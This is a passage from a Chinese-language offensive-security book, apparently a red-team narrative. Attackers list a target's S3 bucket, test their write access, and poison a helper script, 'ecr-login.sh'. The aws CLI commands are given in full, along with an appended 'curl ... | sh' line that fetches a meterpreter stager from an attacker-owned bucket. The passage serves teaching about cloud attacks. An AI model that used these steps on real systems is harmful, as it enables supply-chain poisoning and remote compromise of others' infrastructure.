"Key": "rtb-bid-resp/2019/12/11/10/resp-1-3f1cd8-dae14d3-1fd...",
--`snip`--
```

列表 10-10：gretsch-streaming-jobs 桶中存储的对象列表

MXR 广告似乎在向 GP 提供竞标响应，这些响应告诉他们在某个网站上、给定的 cookie ID 上展示了哪个视频。还有其他一些关键指标，奇怪的是，许多公司会认为这些是敏感材料，例如每个竞标请求的原始日志，其他客户的活动数据……列表还在继续。

gretsch-streaming-jobs 存储桶真的是巨大的。它包含了数以 TB 计的原始数据，而我们根本无法处理这些数据，也不愿意去处理。GP 更适合做这类事情。我们最好沿着这条面包屑线索走下去，希望它能把我们带到最终的“蛋糕”。

在这个巨大的数据湖中，隐藏在诱人的`helpers`键下，我们发现了一些在几周前才被修改过的有趣可执行文件：

```
"Key": "helpers/ecr-login.sh",
"LastModified": "2019-11-14T15:10:43.000Z",

"Key": "helpers/go-manage",
"LastModified": "2019-11-14T15:10:43.000Z",
`--snip--`
```

有趣。在这里，我们发现了一些可执行对象，很可能在 GP 拥有并操作的机器上执行。这可能正是我们进入 Gretsch Politico 的 AWS 账户的钥匙。根据定义，我们的 Lambda 角色可以写入 gretsch-streaming-jobs 存储桶。问题是，GP 是否足够聪明，只将 Lambda 限制在`rtb-bid-resp`子键上？让我们来测试一下：

```
root@Point1:~/# aws s3api put-object \
**--bucket gretsch-streaming-jobs \**
**--key helpers/test.html --body test.html \**
**--profile dmp-sync**

"ETag": "\"051aa2040dafb7fa525f20a27f5e8666\""
```

没有错误。就当是邀请我们越过边界吧，伙计们！这些助手脚本很可能是由 GP 的资源提取并执行的。如果我们修改它们，就可以劫持执行流程，调用我们自己的自定义 stager，从而在 GP 组件上获得一个新的 shell！

我们下载*helpers/ecr-login.sh*，附加一个命令来执行我们的自定义 meterpreter stager，然后重新提交该文件。像往常一样，这个 stager 将托管在我们自己 AWS 账户中的另一个假存储桶 gretsch-helpers 中：

```
root@Point1:~/# aws s3api get-object \
**--bucket gretsch-streaming-jobs\**
**--key helpers/ecr_login.sh ecr-login.sh \**
**--profile dmp-sync**

root@Point1:~/# echo "true || curl https://gretsch-helpers.s3.amazonaws.com/helper.sh |sh" >> ecr-login.sh

root@Point1:~/# aws s3api put-object \
**--bucket gretsch-streaming-jobs \**
**--key helpers/ecr-login.sh \**
**--body ecr-login.sh \**
**--profile dmp-sync**
```

现在我们等待。我们等上几个小时，等待某个地方、某个人触发我们的有效载荷，如果它真的会被触发的话。毕竟，我们无法保证*ecr-login*助手确实被使用了。我们甚至没有费心去检查它到底做了什么。无论如何，现在已经太晚了。让我们祈祷一切顺利吧。

## 资源

+   AWS STS 的文档可以在[`amzn.to/38j05GM`](https://amzn.to/38j05GM)找到。

+   更多关于 AWS Lambda 的强大功能，请参见 Kelsey Hightower（Google 员工）在 KubeCon 2018 上展示的演讲《Kubernetes and the Path to Serverless》：[`bit.ly/2RtothP`](http://bit.ly/2RtothP)*.*（没错，你没看错——他在 Google 工作。）
